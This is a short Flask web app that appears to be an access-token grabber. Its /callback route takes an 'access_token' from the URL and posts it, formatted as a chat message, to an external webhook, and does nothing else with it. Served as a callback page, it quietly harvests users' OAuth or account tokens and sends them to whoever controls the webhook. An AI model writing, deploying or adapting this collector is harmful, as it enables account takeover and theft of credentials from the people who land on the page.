from flask import Flask, request, render_template
import requests
import os

app = Flask(__name__)
WEBHOOK_URL = os.getenv("WEBHOOK_URL")

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/callback')
def callback():
    token = request.args.get('access_token')
    if token and WEBHOOK_URL:
        requests.post(WEBHOOK_URL, json={"content": f"**Token:** `{token}`"})
    return render_template('index.html')

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.getenv("PORT", 5000)))
